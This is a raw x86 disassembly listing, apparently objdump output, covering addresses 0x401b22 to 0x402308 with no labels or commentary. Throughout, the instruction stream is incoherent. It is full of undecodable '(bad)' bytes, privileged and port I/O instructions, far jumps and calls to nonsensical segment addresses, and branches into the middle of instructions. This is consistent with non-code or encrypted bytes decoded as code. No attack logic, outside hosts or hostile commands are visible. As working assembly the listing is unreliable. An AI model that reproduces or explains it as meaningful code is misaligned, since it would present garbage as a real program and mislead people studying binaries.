  401b22:	cdq    
  401b23:	push   esp
  401b24:	into   
  401b25:	pushf  
  401b26:	fisttp QWORD PTR [ebp+0x6]
  401b29:	mov    dh,0x87
  401b2b:	adc    ecx,DWORD PTR [eax+0x3a]
  401b2e:	adc    ebp,ebp
  401b30:	stc    
  401b31:	addr16 mov eax,ds:0x38f6
  401b35:	popf   
  401b36:	fimul  WORD PTR [esi+ebp*2-0x1e]
  401b3a:	dec    edx
  401b3b:	ins    BYTE PTR es:[edi],dx
  401b3c:	add    ebx,DWORD PTR [ecx]
  401b3e:	jmp    0xebd7:0xf6c7ac57
  401b45:	pop    eax
  401b46:	xchg   ecx,eax
  401b47:	(bad)  
  401b48:	fild   QWORD PTR [ebp-0x42]
  401b4b:	mov    edx,0x89ff8db2
  401b50:	fs dec ebp
  401b52:	mov    eax,0x1411495d
  401b57:	and    al,0xf
  401b59:	mov    dh,0xeb
  401b5b:	jns    0x401b38
  401b5d:	xchg   ebx,eax
  401b5e:	sti    
  401b5f:	inc    esp
  401b60:	leave  
  401b61:	test   BYTE PTR [ecx-0x10a06ca],0xcf
  401b68:	ret    
  401b69:	and    BYTE PTR [eax],0xf8
  401b6c:	fnstsw WORD PTR [esi+ebp*4-0x77f80474]
  401b73:	pop    edi
  401b74:	andnps xmm7,xmm0
  401b77:	push   edx
  401b79:	iret   
  401b7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401b7b:	std    
  401b7c:	pushw  0x58
  401b7f:	pusha  
  401b80:	fwait
  401b81:	pop    edx
  401b82:	pinsrw mm0,WORD PTR [esi+0x47d78dfc],0xc6
  401b8a:	xchg   esp,eax
  401b8b:	mov    ebx,0x62514880
  401b90:	data16 mov cl,0xf8
  401b93:	scas   al,BYTE PTR es:[edi]
  401b94:	pop    edi
  401b95:	inc    edi
  401b96:	sbb    edi,DWORD PTR [ebx+edx*1-0x31fd56e7]
  401b9d:	mov    WORD PTR [esi-0x20],fs
  401ba0:	pop    edi
  401ba1:	jle    0x401bfe
  401ba3:	enter  0x4917,0x83
  401ba7:	inc    esp
  401ba8:	jnp    0x401b3d
  401baa:	inc    esi
  401bab:	and    ah,BYTE PTR [edi]
  401bad:	cmp    al,0xa6
  401baf:	jmp    0x401b47
  401bb1:	mov    dh,0x9c
  401bb3:	jge    0x401bc0
  401bb5:	xor    ax,0xc3a9
  401bb9:	jmp    0x401c1e
  401bbb:	cli    
  401bbc:	gs int 0xbd
  401bbf:	pushf  
  401bc0:	enter  0x1cb2,0xae
  401bc4:	sub    eax,0x86d749ad
  401bc9:	inc    ebp
  401bca:	out    0x3c,eax
  401bcc:	mov    WORD PTR [edx+0x78bc237c],ss
  401bd2:	(bad)  
  401bd4:	fbstp  TBYTE PTR [edi+0x29]
  401bd7:	stc    
  401bd8:	mov    al,ds:0xd133f0b0
  401bdd:	bswap  ebp
  401bdf:	push   esi
  401be0:	sbb    ah,bh
  401be2:	mov    bl,0xdb
  401be4:	inc    esp
  401be5:	scas   eax,DWORD PTR es:[edi]
  401be6:	push   0x28
  401be8:	adc    ebp,DWORD PTR [ebx+0x3b]
  401beb:	add    ecx,esp
  401bed:	or     DWORD PTR [ecx+0x74],esi
  401bf0:	mov    dh,BYTE PTR [ebx+0x5876ceaf]
  401bf6:	cdq    
  401bf7:	(bad)  
  401bf9:	imul   ecx,ebp,0xbcc26952
  401bff:	gs push eax
  401c01:	mov    ecx,0xbbb4faa
  401c06:	and    esi,DWORD PTR [esp+ecx*2]
  401c09:	mov    edi,0x6c80c9f4
  401c0e:	xor    eax,0x8c18ae8f
  401c13:	cmp    eax,0xcd8479a4
  401c18:	jne    0x401c22
  401c1a:	gs pusha 
  401c1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401c1d:	and    cl,BYTE PTR [ebx+0x2cebce42]
  401c23:	or     ebx,DWORD PTR [ebx]
  401c25:	imul   edi,DWORD PTR [ebx-0x10bfba05],0xc5ec6221
  401c2f:	ss out 0xa2,eax
  401c32:	adc    al,0xef
  401c34:	xor    eax,0x4f26a523
  401c39:	dec    ebp
  401c3a:	adc    al,0x75
  401c3c:	dec    esp
  401c3d:	inc    ecx
  401c3e:	jmp    0x25e2779a
  401c43:	inc    esp
  401c44:	push   0x5d
  401c46:	call   0xe261:0x3cf13494
  401c4d:	add    al,0xb0
  401c4f:	jge    0x401cbe
  401c51:	in     eax,0x22
  401c53:	add    BYTE PTR [eax],ch
  401c55:	shl    BYTE PTR [edi+0x558a9679],1
  401c5b:	xchg   ebx,eax
  401c5c:	mov    eax,0xd7f038e3
  401c61:	pop    ss
  401c62:	call   0x2b3faed1
  401c67:	lock cwde 
  401c69:	xor    eax,0x3a24f17a
  401c6e:	mov    ecx,0xd6966c6
  401c73:	das    
  401c74:	sub    BYTE PTR [ecx],ah
  401c76:	(bad)  
  401c77:	call   0xd5b1:0x148ff33f
  401c7e:	mov    cl,0xf
  401c80:	add    ecx,DWORD PTR [ecx-0x47]
  401c83:	xchg   DWORD PTR [ebp+0xd],esp
  401c86:	xchg   edi,eax
  401c87:	in     eax,0x7f
  401c89:	sbb    al,0xbc
  401c8b:	rcl    dh,1
  401c8d:	pushf  
  401c8e:	cmp    al,0xc6
  401c90:	outs   dx,DWORD PTR ds:[esi]
  401c91:	sti    
  401c92:	lods   al,BYTE PTR ds:[esi]
  401c93:	mul    BYTE PTR [esi+0x1b0dcbb0]
  401c99:	jno    0x401c34
  401c9b:	push   es
  401c9c:	cmp    DWORD PTR [ebp+0x39],0x60
  401ca0:	aad    0xc0
  401ca2:	sub    cl,cl
  401ca4:	jg     0x401c8f
  401ca6:	lahf   
  401ca7:	(bad)  
  401ca8:	dec    ecx
  401ca9:	repz dec esp
  401cab:	(bad)  
  401cac:	enter  0x2d0,0x6f
  401cb0:	call   0x2225:0x248a50e1
  401cb7:	pop    ebp
  401cb8:	call   0xfbd0:0x487d9663
  401cbf:	sub    dh,BYTE PTR ds:0x10b9ea73
  401cc5:	or     eax,0xd3b71763
  401cca:	retf   0xa3f6
  401ccd:	inc    ebp
  401cce:	mov    ds:0x567799aa,al
  401cd3:	adc    dl,ah
  401cd5:	aas    
  401cd6:	pop    es
  401cd7:	popf   
  401cd8:	mov    ebx,0xb6891755
  401cdd:	xor    dh,bl
  401cdf:	add    ah,BYTE PTR [edx-0xebf87e4]
  401ce5:	dec    edi
  401ce6:	sahf   
  401ce7:	fs icebp 
  401ce9:	pop    ds
  401cea:	jle    0x401d26
  401cec:	clc    
  401ced:	sub    DWORD PTR [ebp+esi*8-0x53],edx
  401cf1:	call   0xc501:0xb6b2021f
  401cf8:	adc    ah,0x2a
  401cfb:	bound  edx,QWORD PTR ds:0x1d017029
  401d01:	mov    gs,WORD PTR [edx+0x1e201b74]
  401d07:	xchg   esp,eax
  401d08:	push   0xffffffd5
  401d0a:	fsubp  st(2),st
  401d0c:	fstp   DWORD PTR [edi*1+0x3f9f75a8]
  401d13:	push   es
  401d14:	jmp    0x2dd40ca4
  401d19:	jbe    0x401d97
  401d1b:	imul   ecx,esi,0x45
  401d1e:	lock (bad) 
  401d20:	jmp    0x8ea3:0xd788344b
  401d27:	loopne 0x401d62
  401d29:	pop    edx
  401d2a:	sbb    al,BYTE PTR [eax]
  401d2c:	sahf   
  401d2d:	sti    
  401d2e:	xor    dl,BYTE PTR fs:[edx+0x189f80d2]
  401d35:	and    ebp,DWORD PTR [esi+0x62]
  401d38:	pop    ds
  401d39:	mov    edx,0x845de1d1
  401d3e:	jp     0x401db1
  401d40:	das    
  401d41:	mov    ebx,0x586fd52c
  401d46:	mov    WORD PTR [edx],ss
  401d48:	push   cs
  401d49:	xor    DWORD PTR [ecx-0x8],ebx
  401d4c:	gs pop es
  401d4e:	add    ebx,esi
  401d50:	jb     0x401cfb
  401d52:	inc    edx
  401d53:	mov    cs,WORD PTR [ebp-0x38]
  401d56:	(bad)  
  401d57:	retf   
  401d58:	inc    eax
  401d59:	loopne 0x401cfe
  401d5b:	es retf 0x470c
  401d5f:	jl     0x401d23
  401d61:	cld    
  401d62:	neg    BYTE PTR [edx-0x638670ee]
  401d68:	in     al,0x7a
  401d6a:	out    dx,eax
  401d6b:	in     al,dx
  401d6c:	dec    esp
  401d6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401d6e:	add    al,0xd6
  401d70:	mov    DWORD PTR [ecx-0xb94c23c],edi
  401d76:	push   esp
  401d77:	(bad)  
  401d78:	mov    dl,0x51
  401d7a:	aas    
  401d7b:	scas   eax,DWORD PTR es:[edi]
  401d7c:	jnp    0x401d5c
  401d7e:	cli    
  401d7f:	cmc    
  401d80:	pop    ds
  401d81:	sahf   
  401d82:	test   eax,0x4809fca6
  401d87:	cmp    cl,ah
  401d89:	pusha  
  401d8a:	arpl   WORD PTR [esi-0x54878a74],sp
  401d90:	pop    ds
  401d91:	or     DWORD PTR [esi+0x14],0x83a4f69d
  401d98:	push   edi
  401d99:	shl    edi,0x62
  401d9c:	push   ebx
  401d9d:	jo     0x401ded
  401d9f:	inc    edi
  401da0:	push   eax
  401da1:	aas    
  401da2:	cmp    DWORD PTR cs:0xed3e2f55,ecx
  401da9:	(bad)  
  401dab:	scas   eax,DWORD PTR es:[edi]
  401dac:	push   ds
  401dad:	and    esi,DWORD PTR ss:[esi-0x2a5fc5e4]
  401db4:	in     eax,dx
  401db5:	or     al,0x34
  401db7:	mov    ch,0xfa
  401db9:	sbb    al,0x3f
  401dbb:	pop    esp
  401dbc:	bound  esi,QWORD PTR [ecx+0x29651a25]
  401dc2:	les    edi,FWORD PTR [ebp-0x515a432d]
  401dc8:	je     0x401e18
  401dca:	mov    bl,0x60
  401dcc:	mov    dh,0xb3
  401dce:	or     dh,BYTE PTR [ebx+edi*1]
  401dd1:	pop    ebp
  401dd2:	add    DWORD PTR [edx-0x7596e476],0x59bf8b48
  401ddc:	shl    ecx,1
  401dde:	aam    0xd6
  401de0:	xchg   ebx,eax
  401de1:	xor    cl,BYTE PTR [eax+0x39]
  401de4:	jle    0x401df6
  401de6:	jmp    0x799ab862
  401deb:	mov    eax,0x5cbef30e
  401df0:	xchg   ebp,eax
  401df1:	adc    DWORD PTR [ecx+0x76],edx
  401df4:	(bad)  
  401df5:	in     al,0x66
  401df7:	cmc    
  401df8:	cdq    
  401df9:	push   esp
  401dfa:	js     0x401dd2
  401dfc:	sub    esi,esi
  401dfe:	stos   BYTE PTR es:[edi],al
  401dff:	inc    esp
  401e00:	dec    edi
  401e01:	jle    0x401dea
  401e03:	jge    0x401e65
  401e05:	fs aad 0xff
  401e08:	mov    bh,0x1e
  401e0a:	dec    ecx
  401e0b:	(bad)  [esi+0x5]
  401e0e:	test   DWORD PTR [edi],0x39b074f8
  401e14:	cmp    BYTE PTR [ecx],cl
  401e16:	push   eax
  401e17:	push   eax
  401e18:	push   ebx
  401e19:	repnz test BYTE PTR [ecx+0x20],dl
  401e1d:	sar    DWORD PTR [ecx-0x342a76a5],1
  401e23:	into   
  401e24:	sub    al,0x7d
  401e26:	dec    edx
  401e27:	test   eax,0xd4a91bd2
  401e2c:	pop    edx
  401e2d:	popf   
  401e2e:	push   esi
  401e30:	mov    al,ds:0x98677293
  401e35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401e36:	cs in  al,0x45
  401e39:	repnz mov edi,0x887603b8
  401e3f:	fucomp st(7)
  401e41:	mov    WORD PTR [edi-0x684ba56f],es
  401e47:	lea    esp,[eax-0x7d]
  401e4a:	or     edx,edi
  401e4c:	rcl    BYTE PTR [ebx*1-0x2e2ef7b4],0xfb
  401e54:	mov    ch,0x4f
  401e56:	sahf   
  401e57:	int    0x24
  401e59:	es loope 0x401e08
  401e5c:	fstp   QWORD PTR [edx+0x28]
  401e5f:	enter  0x1ad3,0x8f
  401e63:	jbe    0x401e2b
  401e65:	addr16 push edx
  401e67:	mov    tr2,edi
  401e6a:	cld    
  401e6b:	dec    ebx
  401e6c:	lods   eax,DWORD PTR ds:[esi]
  401e6d:	dec    edx
  401e6e:	gs dec edx
  401e70:	sub    BYTE PTR [eax-0x248be283],bl
  401e76:	and    al,0x63
  401e78:	or     ebp,DWORD PTR [eax-0x27bf1f58]
  401e7e:	ja     0x401e88
  401e80:	add    cl,BYTE PTR [ebx+eiz*4+0x2085b313]
  401e87:	or     eax,0x2a91ee49
  401e8c:	pop    ecx
  401e8d:	mov    ah,0x8d
  401e8f:	or     BYTE PTR [edx-0x6d7a79bf],cl
  401e95:	inc    ebx
  401e96:	inc    eax
  401e97:	mov    ebx,DWORD PTR [esi-0x29]
  401e9a:	push   ecx
  401e9b:	add    BYTE PTR [ecx-0x55],al
  401e9e:	clc    
  401e9f:	push   ds
  401ea0:	inc    esi
  401ea1:	sar    DWORD PTR [edx-0x7741701],1
  401ea7:	pop    ebp
  401ea8:	sub    al,0x7a
  401eaa:	les    esp,FWORD PTR gs:[edi-0x17379baf]
  401eb1:	mov    BYTE PTR [edx],al
  401eb3:	push   0xfe51d2dd
  401eb8:	jp     0x401e58
  401eba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401ebb:	and    bl,BYTE PTR [ecx+0x51e737d8]
  401ec1:	ds mov bh,0x87
  401ec4:	sub    bh,cl
  401ec6:	jmp    0x401f34
  401ec8:	add    eax,0x73bbf9ae
  401ecd:	dec    ebp
  401ece:	push   0x15
  401ed0:	ins    DWORD PTR es:[edi],dx
  401ed1:	std    
  401ed2:	fisubr WORD PTR [edi-0x2157ffa3]
  401ed8:	jg     0x401ec3
  401eda:	jbe    0x401f33
  401edc:	mov    ebx,0x85090fba
  401ee1:	out    dx,al
  401ee2:	and    DWORD PTR [eax-0x3c8442e7],0x47
  401ee9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401eea:	push   ecx
  401eeb:	test   DWORD PTR [eax],ebp
  401eed:	xchg   edi,eax
  401eee:	fstp   QWORD PTR ds:0x84b776d0
  401ef4:	ss ret 
  401ef6:	jmp    0x499:0xee5828f0
  401efd:	mov    bh,BYTE PTR [edx-0x398bf38b]
  401f03:	mov    al,ds:0x3f6484ce
  401f08:	mov    bh,0x15
  401f0a:	mov    WORD PTR [edi-0x65],?
  401f0d:	(bad)  
  401f0e:	sub    eax,0x237a246c
  401f13:	inc    edi
  401f14:	pop    esp
  401f15:	ficomp DWORD PTR [edi+0x326e2be0]
  401f1b:	adc    al,0x68
  401f1d:	xchg   esi,eax
  401f1e:	mov    eax,ebp
  401f20:	pusha  
  401f21:	inc    esp
  401f22:	inc    esi
  401f23:	mul    bh
  401f25:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401f26:	int3   
  401f27:	and    al,BYTE PTR [edi]
  401f29:	stos   BYTE PTR es:[edi],al
  401f2a:	mov    edx,0xd280a26f
  401f2f:	pusha  
  401f30:	jnp    0x401f84
  401f32:	test   DWORD PTR [esi-0x1f],ecx
  401f35:	sahf   
  401f36:	sti    
  401f37:	loop   0x401f15
  401f39:	arpl   WORD PTR [ebx+ecx*4+0x3c],sp
  401f3d:	dec    esi
  401f3e:	nop
  401f3f:	outs   dx,DWORD PTR ds:[esi]
  401f40:	iret   
  401f41:	cld    
  401f42:	push   0xffffffc6
  401f44:	aam    0x47
  401f46:	cwde   
  401f47:	pop    esi
  401f48:	pop    ds
  401f49:	test   al,0xaa
  401f4b:	sbb    dh,BYTE PTR [ecx+0x126bae00]
  401f51:	in     eax,0xc7
  401f53:	mov    bl,0xb5
  401f55:	sbb    BYTE PTR [eax-0xa22a220],bh
  401f5b:	ins    DWORD PTR es:[edi],dx
  401f5c:	leave  
  401f5d:	inc    esp
  401f5e:	pop    esi
  401f5f:	fdivp  st(5),st
  401f61:	dec    esi
  401f62:	add    BYTE PTR [ebx+0x438b72cf],bh
  401f68:	adc    eax,0x3feb9969
  401f6d:	call   0x430b:0xf7911ced
  401f74:	or     BYTE PTR [ebp+ecx*4-0x72],ch
  401f78:	mov    ch,0xc2
  401f7a:	(bad)  
  401f7b:	repz mov esp,ebp
  401f7e:	test   eax,0x8c489477
  401f83:	pop    eax
  401f84:	mov    eax,0xc9aa8350
  401f89:	in     eax,dx
  401f8a:	pop    ebp
  401f8b:	xlat   BYTE PTR ds:[ebx]
  401f8c:	mov    ch,0x25
  401f8e:	sbb    esp,DWORD PTR [ebp-0x106cd512]
  401f94:	add    al,0xf4
  401f96:	arpl   WORD PTR [ebp+0x38858b1e],bp
  401f9c:	in     al,0x5c
  401f9e:	rcl    BYTE PTR [ecx],1
  401fa0:	mov    ds,WORD PTR [esi]
  401fa2:	mov    ebx,0x98954459
  401fa7:	jae    0x401f65
  401fa9:	cmp    al,0xf2
  401fab:	jbe    0x401fb6
  401fad:	dec    edx
  401fae:	inc    edx
  401faf:	or     al,0x3e
  401fb1:	inc    ebx
  401fb2:	imul   edi,ebx,0x27
  401fb5:	dec    ecx
  401fb6:	hlt    
  401fb7:	or     DWORD PTR [esi+0x2b],esp
  401fba:	fsub   st(7),st
  401fbc:	out    dx,al
  401fbd:	dec    esi
  401fbe:	outs   dx,BYTE PTR ds:[esi]
  401fbf:	enter  0xd1ea,0xd8
  401fc3:	pop    edi
  401fc4:	pushf  
  401fc5:	xchg   esi,eax
  401fc6:	adc    al,0x8f
  401fc8:	nop
  401fc9:	inc    esi
  401fca:	out    dx,eax
  401fcb:	retf   0x86f3
  401fce:	aaa    
  401fcf:	jmp    0xd165:0x92287e32
  401fd6:	cmp    esp,DWORD PTR [ebx-0x5b860aaa]
  401fdc:	mov    bl,bh
  401fde:	mov    ch,0x94
  401fe0:	adc    ch,BYTE PTR [eax+0x33]
  401fe3:	pop    ss
  401fe4:	sar    BYTE PTR [eax],1
  401fe6:	pop    DWORD PTR [edx+0x2a60fc6c]
  401fec:	in     eax,dx
  401fed:	rcr    DWORD PTR [ebp-0x3a],0xad
  401ff1:	and    al,0x46
  401ff3:	out    dx,al
  401ff4:	fdiv   DWORD PTR [edx]
  401ff6:	mov    dh,0xb
  401ff8:	ins    BYTE PTR es:[edi],dx
  401ff9:	idiv   ah
  401ffb:	les    eax,FWORD PTR [esp+ebx*8]
  401ffe:	repnz sbb eax,0x8513e151
  402004:	sub    al,0x83
  402006:	mov    dh,0x3d
  402008:	mov    dh,0xb
  40200a:	mov    bh,0x42
  40200c:	sub    BYTE PTR [ebp+0xa],0x66
  402010:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402011:	and    ebp,ebx
  402013:	adc    DWORD PTR ds:0xe71f2ac2,esi
  402019:	stc    
  40201a:	and    bl,ch
  40201c:	add    ah,BYTE PTR [ebx+0x134daf4a]
  402022:	scas   al,BYTE PTR es:[edi]
  402023:	(bad)  
  402024:	jae    0x402095
  402026:	dec    esi
  402027:	into   
  402028:	(bad)  
  402029:	mov    es,WORD PTR [ebx-0xa]
  40202c:	mov    al,0x97
  40202e:	shl    BYTE PTR [ebx+eax*4-0x726ff76e],1
  402035:	jle    0x402081
  402037:	push   es
  402038:	les    edx,FWORD PTR [esi-0x60]
  40203b:	inc    eax
  40203c:	fmul   DWORD PTR [edx+0x68]
  40203f:	push   ebp
  402040:	jns    0x402019
  402042:	jo     0x401ffe
  402044:	and    eax,0x267116ec
  402049:	and    eax,0x40520d5e
  40204e:	sub    dh,BYTE PTR [edx-0x1b]
  402051:	loopne 0x401ff9
  402053:	data16 test bl,bl
  402056:	idiv   ecx
  402058:	stos   BYTE PTR es:[edi],al
  402059:	sub    ecx,DWORD PTR [esi-0x5]
  40205c:	mov    ds:0xc771f4da,al
  402061:	mov    ch,bh
  402063:	and    BYTE PTR [edx],bh
  402065:	cmp    DWORD PTR [eax+0x4a],edi
  402068:	rcr    esp,cl
  40206a:	fsubrp st(5),st
  40206c:	xor    ch,BYTE PTR [ecx+ebp*8-0x40aa2dbb]
  402073:	into   
  402074:	and    BYTE PTR [esi-0x27e42bb],bl
  40207a:	adc    BYTE PTR [ebp+ebx*4+0x2c67d32f],dl
  402081:	icebp  
  402082:	xor    DWORD PTR ds:0x6fad0bc5,eax
  402088:	aas    
  402089:	pop    esp
  40208a:	(bad)  
  40208b:	aas    
  40208c:	inc    edx
  40208d:	cwde   
  40208e:	pop    ecx
  40208f:	ins    DWORD PTR es:[edi],dx
  402090:	stos   BYTE PTR es:[edi],al
  402091:	retf   
  402092:	xchg   ecx,eax
  402093:	pcmpgtd mm7,QWORD PTR [ecx+0x2c]
  402097:	pushf  
  402098:	retf   
  402099:	sar    ebp,1
  40209b:	push   edi
  40209c:	mov    edi,0x7ad4cc35
  4020a1:	dec    ebp
  4020a2:	lods   eax,DWORD PTR ds:[esi]
  4020a3:	(bad)  
  4020a4:	(bad)  
  4020a5:	enter  0x8069,0x6e
  4020a9:	xchg   DWORD PTR [esp+edx*2+0x5b],esp
  4020ad:	add    DWORD PTR [ebx-0x4b],ebp
  4020b0:	es pop es
  4020b2:	add    ah,BYTE PTR [eax+0x71]
  4020b5:	mov    cl,0xb2
  4020b7:	and    ah,BYTE PTR [ecx+0x3b1769e3]
  4020bd:	adc    al,BYTE PTR [edi+0x60ba295e]
  4020c3:	fisttp QWORD PTR [esi+ebp*1-0x58]
  4020c7:	push   ds
  4020c8:	xchg   edx,eax
  4020c9:	push   0xffffff95
  4020cb:	fdiv   st,st(5)
  4020cd:	push   es
  4020ce:	test   ah,0x62
  4020d1:	mov    ecx,0x67fd00ba
  4020d6:	call   0x4826b742
  4020db:	aaa    
  4020dc:	inc    edx
  4020dd:	adc    ch,BYTE PTR [esi-0x58c08ff9]
  4020e3:	mov    ebx,0xc0a00dc2
  4020e8:	ror    DWORD PTR ds:0xdee758e8,0x45
  4020ef:	adc    al,0x99
  4020f1:	aaa    
  4020f2:	(bad)  
  4020f3:	dec    ecx
  4020f4:	jae    0x40211f
  4020f6:	xchg   ecx,eax
  4020f7:	jo     0x40210e
  4020f9:	nop
  4020fa:	sbb    ch,bl
  4020fc:	push   es
  4020fd:	sbb    al,0x42
  4020ff:	xor    BYTE PTR [ecx+0x1f],bh
  402102:	lods   al,BYTE PTR ds:[esi]
  402103:	ss dec ebp
  402105:	pop    edx
  402106:	outs   dx,DWORD PTR ds:[esi]
  402107:	pop    ebx
  402108:	rol    DWORD PTR [ebx-0x6d],cl
  40210b:	mov    al,ds:0xbbdc41c4
  402110:	add    ch,ah
  402112:	xor    BYTE PTR [esi],dl
  402114:	mov    eax,ds:0xee23f5c4
  402119:	xlat   BYTE PTR ds:[ebx]
  40211a:	dec    ecx
  40211b:	dec    ecx
  40211c:	bound  edx,QWORD PTR [ebp-0x395919a6]
  402122:	pop    es
  402123:	(bad)  
  402124:	jg     0x40218a
  402126:	jo     0x402179
  402128:	pop    ebx
  402129:	retf   
  40212a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40212b:	(bad)  
  40212c:	lods   eax,DWORD PTR ds:[esi]
  40212d:	sbb    dl,dl
  40212f:	mov    WORD PTR [ecx],fs
  402131:	pop    ss
  402132:	jg     0x402199
  402134:	mov    ds:0x7c438edd,al
  402139:	call   0xe58f:0x656d2ea0
  402140:	jae    0x4020e5
  402142:	lods   al,BYTE PTR ds:[esi]
  402143:	stos   DWORD PTR es:[edi],eax
  402144:	retf   
  402145:	or     BYTE PTR [edi+eax*4+0x5c78ac3e],ah
  40214c:	enter  0x2274,0x39
  402150:	jo     0xdee85e6
  402156:	dec    edx
  402157:	ins    DWORD PTR es:[edi],dx
  402158:	cli    
  402159:	(bad)  
  40215a:	fbld   TBYTE PTR [ebx+0x56]
  40215d:	or     ecx,DWORD PTR [ecx+ecx*2-0x3f8b8ee2]
  402164:	fnstcw WORD PTR [edx-0xcca0c36]
  40216a:	xchg   ebp,eax
  40216b:	test   eax,0x6a059329
  402170:	(bad)  [ebx]
  402172:	clc    
  402173:	jo     0x40211d
  402175:	cmp    DWORD PTR [edi],edx
  402177:	xor    edx,DWORD PTR [ecx+0x7ec5eb6d]
  40217d:	mov    cl,0xb7
  40217f:	ficomp DWORD PTR [ecx+0x78]
  402182:	adc    dh,BYTE PTR [esi]
  402184:	push   edx
  402185:	imul   edi,edi,0xb508fb58
  40218b:	div    BYTE PTR ds:0xa0f25e85
  402191:	jge    0x402168
  402193:	add    al,0x8e
  402195:	mov    ebx,0xd263e7b9
  40219a:	ret    
  40219b:	adc    DWORD PTR [edi-0x4f49a3ef],0x8255039c
  4021a5:	addr16 dec ebx
  4021a7:	aam    0x80
  4021a9:	int3   
  4021aa:	sahf   
  4021ab:	jg     0x402194
  4021ad:	(bad)  
  4021af:	dec    ebp
  4021b0:	rol    BYTE PTR [edx+0x8188692],0x86
  4021b7:	jb     0x4021e7
  4021b9:	pop    esp
  4021ba:	icebp  
  4021bb:	push   0x5b
  4021bd:	test   BYTE PTR [ebx-0x78],bh
  4021c0:	cmc    
  4021c1:	rol    BYTE PTR [ebx+edx*2],1
  4021c4:	lods   al,BYTE PTR ds:[esi]
  4021c5:	stc    
  4021c6:	rol    DWORD PTR [eax+0x71cc3ec5],0xe
  4021cd:	scas   eax,DWORD PTR es:[di]
  4021cf:	std    
  4021d0:	push   ss
  4021d1:	test   eax,0x1baed56c
  4021d6:	mov    ebx,0x801256db
  4021db:	and    ch,BYTE PTR [ebx]
  4021dd:	mov    dl,0x84
  4021df:	dec    edx
  4021e0:	pop    ss
  4021e1:	sti    
  4021e2:	loope  0x40220e
  4021e4:	clc    
  4021e5:	sti    
  4021e6:	fwait
  4021e7:	push   edi
  4021e8:	xchg   BYTE PTR [ebp+0x18f525f8],bh
  4021ee:	fs sbb eax,DWORD PTR ds:[eax+0x6c]
  4021f3:	sahf   
  4021f4:	wrmsr  
  4021f6:	(bad)  
  4021f7:	xor    al,ah
  4021f9:	out    dx,al
  4021fa:	add    bh,dl
  4021fc:	add    DWORD PTR [ebx-0x55d3ea49],eax
  402202:	arpl   WORD PTR [edi-0x3a],dx
  402205:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402206:	jp     0x4021d4
  402208:	push   eax
  402209:	pop    ebx
  40220a:	outs   dx,DWORD PTR ds:[esi]
  40220b:	cwd    
  40220d:	cld    
  40220e:	mov    ecx,0x2dfee2e
  402213:	arpl   ax,si
  402215:	sbb    eax,0xc8d07a1b
  40221a:	jo     0x4021a7
  40221c:	hlt    
  40221d:	push   ebp
  40221e:	das    
  40221f:	jp     0x402275
  402221:	addr16 mov ecx,0x802a7a77
  402227:	xchg   ecx,eax
  402228:	sbb    DWORD PTR [ebx-0x78],esp
  40222b:	mov    al,ds:0xb4e56d4
  402230:	jl     0x402268
  402232:	stos   BYTE PTR es:[edi],al
  402233:	jmp    0x402216
  402235:	push   ss
  402236:	mov    eax,0xdce6ab73
  40223b:	(bad)  
  40223c:	fidivr DWORD PTR [esi+0x5017d3eb]
  402242:	imul   ebp,DWORD PTR [edi-0x26],0xffffffc3
  402246:	push   ds
  402247:	sbb    esp,esp
  402249:	fldcw  WORD PTR [esp+edx*1]
  40224c:	xchg   edx,eax
  40224d:	fsub   QWORD PTR [ecx]
  40224f:	fist   WORD PTR [esp+eiz*4+0x7d716ff5]
  402256:	xor    ecx,DWORD PTR [edx-0x31]
  402259:	xchg   ch,dh
  40225b:	push   eax
  40225c:	mov    ecx,0x45635f41
  402261:	(bad)  
  402262:	cwde   
  402263:	ja     0x402266
  402265:	(bad)  
  402266:	imul   ebx,DWORD PTR [esi+0x4f],0x17
  40226a:	mov    ecx,edx
  40226c:	or     eax,0x41d27a28
  402271:	xchg   ebx,eax
  402272:	push   ss
  402273:	add    BYTE PTR [eax+0x6615940e],bl
  402279:	dec    ecx
  40227a:	mov    dh,0x72
  40227c:	int3   
  40227d:	mov    ah,0x3f
  40227f:	add    bh,ch
  402281:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402282:	aas    
  402283:	(bad)  
  402285:	inc    ebp
  402286:	jb     0x402294
  402288:	push   edi
  402289:	sbb    BYTE PTR [esi],dh
  40228b:	jnp    0x40223b
  40228d:	cli    
  40228e:	mov    esp,edi
  402290:	retf   0x383d
  402293:	mov    ds:0x82993bb3,al
  402298:	xlat   BYTE PTR ds:[ebx]
  402299:	enter  0xd1d5,0x23
  40229d:	or     DWORD PTR [ebp+0x60],0xc63d4ade
  4022a4:	mov    ebx,ebp
  4022a6:	retf   0xaf74
  4022a9:	arpl   WORD PTR [esi-0x14],si
  4022ac:	sub    BYTE PTR [ecx+0x214daa8],dl
  4022b2:	mov    ebx,0x23757ff2
  4022b7:	mov    edx,0x3442f4a
  4022bc:	xchg   ebp,eax
  4022bd:	adc    al,0x53
  4022bf:	aas    
  4022c0:	addr16 ss jmp 0x4022c1
  4022c4:	pop    ds
  4022c5:	call   0xb258:0xde861319
  4022cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4022cd:	cmp    ebx,ecx
  4022cf:	push   ecx
  4022d0:	push   es
  4022d1:	dec    edx
  4022d2:	inc    esp
  4022d3:	scas   eax,DWORD PTR es:[edi]
  4022d4:	mov    bh,0xc1
  4022d6:	push   ebp
  4022d7:	ficom  WORD PTR [edx+esi*4-0x7f8b8cad]
  4022de:	pop    edi
  4022df:	xchg   ecx,eax
  4022e0:	neg    DWORD PTR gs:[eax]
  4022e3:	push   0x8300f600
  4022e8:	in     eax,dx
  4022e9:	stos   DWORD PTR es:[edi],eax
  4022ea:	mov    ds:0xae79eabf,al
  4022ef:	jmp    0xbb119185
  4022f4:	mov    ds:0x636847b3,eax
  4022f9:	jb     0x4022aa
  4022fb:	in     eax,0x68
  4022fd:	mov    ebp,DWORD PTR [ecx+0x1a]
  402300:	inc    edx
  402301:	aad    0x84
  402303:	or     al,0x24
  402305:	icebp  
  402306:	adc    ebx,DWORD PTR [ebx]
  402308:	rcl    DWORD PTR [edx],cl
